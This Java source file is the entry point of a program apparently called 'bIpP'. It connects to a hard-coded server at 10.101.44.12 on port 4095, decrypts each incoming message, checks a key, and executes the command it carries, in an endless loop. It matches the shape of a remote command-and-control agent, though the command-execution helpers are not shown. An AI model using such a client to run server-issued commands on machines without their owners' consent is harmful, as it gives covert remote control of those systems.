package com.owlfloater898.bIpP;

import java.io.IOException;
import java.net.UnknownHostException;

import org.json.simple.JSONObject;

import com.owlfloater898.bIpP.connections.Commands;
import com.owlfloater898.bIpP.connections.Messages;
import com.owlfloater898.bIpP.connections.Sockets;

/**
 * This class serves as the entry point of the program and is responsible for establishing the connection
 * to the bipp server, receiving the command from the server, and executing the command
 * @author jjwaldo514
 *
 */
public class Main {
/**
 * Establishes a connection to the BiPp server on port 4095. 
 * Receives all messages sent from the server and attempts to decrypt them. If Decryption is successful, 
 * the command sent is executed.
 * @param args
 * @throws UnknownHostException
 * @throws IOException
 */
	public static void main(String[] args) throws UnknownHostException, IOException
	{
		Sockets sockets = new Sockets();
		Commands commands = new Commands();
		Messages messages = new Messages();
		sockets.createSocket("10.101.44.12", 4095);
		while (true)
		{
			String encryptedMessage = sockets.receiveMessage();
			String decryptedMessage = null;
			try 
			{
				decryptedMessage = messages.decryptMessage(encryptedMessage);
			}
			catch (Exception e) 
			{
				e.printStackTrace();
			}
			JSONObject jobj = messages.getJSONObject(decryptedMessage);
			if (messages.testKey(jobj))
			{
				commands.executeCommand(commands.parseCommand(commands.getCommandToExecute(jobj)));
			}
		}
	}
}
